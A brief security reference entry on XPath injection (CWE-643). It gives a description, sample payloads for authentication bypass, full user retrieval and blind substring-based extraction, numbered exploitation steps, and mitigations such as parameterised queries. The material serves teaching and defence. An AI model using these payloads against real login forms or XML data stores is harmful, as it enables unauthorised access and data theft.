High Severity

📌 XPath Injection

🧠 Description

XPath Injection allows attackers to inject malicious XPath expressions into queries that use user input. This can bypass authentication, retrieve arbitrary XML document data, or modify data.

🏷️ Classification

  • Type: Injection
  • CWE: CWE-643: Improper Neutralization of Data within XPath Expressions

💣 Basic Payloads

# Authentication bypass
' or '1'='1
' or ''='

# Retrieve all users
' or 1=1 or ''='

# Blind extraction
' and substring(//user[1]/@id,1,1)='a' and ''='

⚙️ Exploitation

  1. Test with ' or '1'='1 in login form.
  2. If bypassed, use XPath functions (substring(), count()) to extract data.
  3. Enumerate node names and values.

🛡️ Mitigation

✅ Use parameterised XPath queries (not always possible)
✅ Escape single quotes and square brackets
✅ Use XPath pre‑compilation with variable bindings
